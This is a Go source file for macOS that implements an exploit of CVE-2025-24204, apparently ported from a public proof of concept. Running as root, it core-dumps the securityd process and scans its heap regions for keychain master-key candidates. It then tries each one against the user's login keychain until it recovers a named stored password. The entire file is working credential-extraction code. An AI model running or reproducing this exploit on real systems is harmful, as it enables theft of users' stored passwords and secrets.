//go:build darwin

package keyretriever

// CVE-2025-24204
// Logic ported from https://github.com/FFRI/CVE-2025-24204/tree/main/decrypt-keychain
// https://support.apple.com/en-us/122373

import (
	"debug/macho"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/unix"
)

var (
	homeDir, _        = os.UserHomeDir()
	loginKeychainPath = homeDir + "/Library/Keychains/login.keychain-db"
)

// DecryptKeychain extracts a keychain secret by dumping the securityd process memory.
// Requires root privileges.
func DecryptKeychain(storageName string) (string, error) {
	if os.Geteuid() != 0 {
		return "", errors.New("requires root privileges")
	}

	pid, err := findSecuritydPID()
	if err != nil {
		return "", err
	}

	corePath, err := dumpSecuritydMemory(pid)
	if err != nil {
		return "", err
	}
	defer os.Remove(corePath)

	candidates, err := scanMasterKeyCandidates(pid, corePath)
	if err != nil {
		return "", err
	}

	return matchKeychainSecret(candidates, storageName)
}

// findSecuritydPID locates the root-owned securityd process.
func findSecuritydPID() (int, error) {
	buf, err := unix.SysctlRaw("kern.proc.all")
	if err != nil {
		return 0, fmt.Errorf("sysctl kern.proc.all: %w", err)
	}

	kinfoSize := int(unsafe.Sizeof(unix.KinfoProc{}))
	if len(buf)%kinfoSize != 0 {
		return 0, fmt.Errorf("sysctl kern.proc.all: invalid data length")
	}

	count := len(buf) / kinfoSize
	for i := 0; i < count; i++ {
		proc := (*unix.KinfoProc)(unsafe.Pointer(&buf[i*kinfoSize]))
		name := byteSliceToString(proc.Proc.P_comm[:])
		if name == "securityd" && proc.Eproc.Pcred.P_ruid == 0 {
			return int(proc.Proc.P_pid), nil
		}
	}
	return 0, fmt.Errorf("securityd process not found")
}

// dumpSecuritydMemory creates a core dump of the securityd process.
func dumpSecuritydMemory(pid int) (string, error) {
	corePath := filepath.Join(os.TempDir(), fmt.Sprintf("securityd-core-%d", time.Now().UnixNano()))
	cmd := exec.Command("gcore", "-d", "-s", "-v", "-o", corePath, strconv.Itoa(pid))
	if err := cmd.Run(); err != nil {
		return "", fmt.Errorf("gcore dump failed: %w", err)
	}
	return corePath, nil
}

// scanMasterKeyCandidates scans the core dump for potential master key patterns.
func scanMasterKeyCandidates(pid int, corePath string) ([]string, error) {
	regions, err := findMallocSmallRegions(pid)
	if err != nil {
		return nil, fmt.Errorf("find malloc regions: %w", err)
	}

	cmf, err := macho.Open(corePath)
	if err != nil {
		return nil, fmt.Errorf("open core dump: %w", err)
	}
	defer cmf.Close()

	var candidates []string
	seen := make(map[string]struct{})

	for _, region := range regions {
		data, vaddr, err := getMallocSmallRegionData(cmf, region)
		if err != nil {
			continue
		}
		found := scanRegionForKeys(data, vaddr, region)
		for _, key := range found {
			if _, ok := seen[key]; !ok {
				candidates = append(candidates, key)
				seen[key] = struct{}{}
			}
		}
	}
	return candidates, nil
}

// scanRegionForKeys searches a memory region for the 0x18 pattern followed by a pointer.
func scanRegionForKeys(data []byte, vaddr uint64, region addressRange) []string {
	var keys []string
	for i := 0; i < len(data)-16; i += 8 {
		val := binary.LittleEndian.Uint64(data[i : i+8])
		if val != 0x18 {
			continue
		}
		ptr := binary.LittleEndian.Uint64(data[i+8 : i+16])
		if ptr < region.start || ptr > region.end {
			continue
		}
		offset := ptr - vaddr
		if offset+0x18 > uint64(len(data)) {
			continue
		}
		masterKey := make([]byte, 0x18)
		copy(masterKey, data[offset:offset+0x18])
		keys = append(keys, fmt.Sprintf("%x", masterKey))
	}
	return keys
}

// matchKeychainSecret tries each candidate key against the keychain to find the target secret.
func matchKeychainSecret(candidates []string, storageName string) (string, error) {
	for _, candidate := range candidates {
		kc, err := New(loginKeychainPath, candidate)
		if err != nil {
			continue
		}
		records, err := kc.DumpGenericPasswords()
		if err != nil {
			continue
		}
		for _, rec := range records {
			if rec.Account == storageName {
				if rec.PasswordBase64 {
					decoded, err := base64.StdEncoding.DecodeString(rec.Password)
					if err == nil {
						return string(decoded), nil
					}
				}
				return rec.Password, nil
			}
		}
	}
	return "", fmt.Errorf("secret %q not found in keychain", storageName)
}

type addressRange struct {
	start uint64
	end   uint64
}

func findMallocSmallRegions(pid int) ([]addressRange, error) {
	output, err := exec.Command("vmmap", "--wide", strconv.Itoa(pid)).Output()
	if err != nil {
		return nil, fmt.Errorf("vmmap: %w", err)
	}

	var regions []addressRange
	for _, line := range strings.Split(string(output), "\n") {
		line = strings.TrimSpace(line)
		if !strings.HasPrefix(line, "MALLOC_SMALL") {
			continue
		}
		parts := strings.Fields(line)
		if len(parts) < 2 {
			continue
		}
		rangeParts := strings.Split(parts[1], "-")
		if len(rangeParts) != 2 {
			continue
		}
		start, err := strconv.ParseUint(strings.TrimPrefix(rangeParts[0], "0x"), 16, 64)
		if err != nil {
			continue
		}
		end, err := strconv.ParseUint(strings.TrimPrefix(rangeParts[1], "0x"), 16, 64)
		if err != nil {
			continue
		}
		regions = append(regions, addressRange{start: start, end: end})
	}
	return regions, nil
}

func getMallocSmallRegionData(f *macho.File, region addressRange) ([]byte, uint64, error) {
	for _, seg := range f.Loads {
		s, ok := seg.(*macho.Segment)
		if !ok {
			continue
		}
		if s.Addr == region.start && s.Addr+s.Memsz == region.end {
			data := make([]byte, s.Filesz)
			if _, err := s.ReadAt(data, 0); err != nil {
				return nil, 0, err
			}
			return data, s.Addr, nil
		}
	}
	return nil, 0, fmt.Errorf("region not found in core dump")
}

func byteSliceToString(s []byte) string {
	for i, v := range s {
		if v == 0 {
			return string(s[:i])
		}
	}
	return string(s)
}
